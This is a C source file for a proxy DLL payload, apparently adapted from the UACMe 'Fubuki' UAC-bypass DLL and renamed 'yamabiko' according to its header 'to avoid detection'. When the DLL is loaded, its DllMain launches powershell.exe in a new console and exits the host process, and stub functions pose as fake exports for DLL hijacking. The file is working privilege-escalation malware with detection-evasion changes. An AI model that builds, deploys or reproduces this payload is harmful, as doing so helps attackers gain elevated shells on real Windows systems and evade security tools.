/*******************************************************************************
*  Notes: Originally fubuki.dll. Stripped down here with some minor changes
*         to avoid detection and as part of that renamed to yamabiko.
*                                                                     ~b33f
********************************************************************************
*  (C) COPYRIGHT AUTHORS, 2014 - 2016
*
*  TITLE:       DLLMAIN.C
*
*  VERSION:     2.51
*
*  DATE:        10 July 2016
*
*  Proxy dll entry point, Fubuki Kai Ni.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#if !defined UNICODE
#error ANSI build is not supported
#endif

//disable nonmeaningful warnings.
#pragma warning(disable: 4005) // macro redefinition
#pragma warning(disable: 4055) // %s : from data pointer %s to function pointer %s
#pragma warning(disable: 4152) // nonstandard extension, function/data pointer conversion in expression
#pragma warning(disable: 4201) // nonstandard extension used : nameless struct/union
#pragma warning(disable: 6102) // Using %s from failed function call at line %u

#include <windows.h>
#include "Shared\ntos.h"
#include <ntstatus.h>
#include "Shared\minirtl.h"
#include "unbcl.h"
#include "wbemcomn.h"

#if (_MSC_VER >= 1900) 
#ifdef _DEBUG
#pragma comment(lib, "vcruntimed.lib")
#pragma comment(lib, "ucrtd.lib")
#else
#pragma comment(lib, "libvcruntime.lib")
#endif
#endif

/*
* Funky
*
* Purpose:
*
* Stub for fake exports.
*
*/
VOID WINAPI Funky(
    VOID
    )
{
}

/*
* DllMain
*
* Purpose:
*
* Proxy dll entry point, process parameter if exist or start cmd.exe and exit immediatelly.
*
*/
BOOL WINAPI DllMain(
    _In_ HINSTANCE hinstDLL,
    _In_ DWORD fdwReason,
    _In_ LPVOID lpvReserved
)
{
    DWORD					cch;
    TCHAR					cmdbuf[MAX_PATH * 2], sysdir[MAX_PATH + 1];
    STARTUPINFO				startupInfo;
    PROCESS_INFORMATION		processInfo;

    UNREFERENCED_PARAMETER(hinstDLL);
    UNREFERENCED_PARAMETER(lpvReserved);

    if (fdwReason == DLL_PROCESS_ATTACH) {

        RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
        RtlSecureZeroMemory(&processInfo, sizeof(processInfo));
        startupInfo.cb = sizeof(startupInfo);
        GetStartupInfoW(&startupInfo);         
        
        RtlSecureZeroMemory(sysdir, sizeof(sysdir));
        cch = ExpandEnvironmentStrings(TEXT("%systemroot%\\system32\\WindowsPowerShell\\v1.0\\"), sysdir, MAX_PATH);
        if ((cch != 0) && (cch < MAX_PATH)) {
            RtlSecureZeroMemory(cmdbuf, sizeof(cmdbuf));
            _strcpy(cmdbuf, sysdir);
            _strcat(cmdbuf, TEXT("powershell.exe"));

            if (CreateProcessW(cmdbuf, NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL,
                sysdir, &startupInfo, &processInfo))
            {
                CloseHandle(processInfo.hProcess);
                CloseHandle(processInfo.hThread);
            }
        }

        ExitProcess(0);
    }
    return TRUE;
}
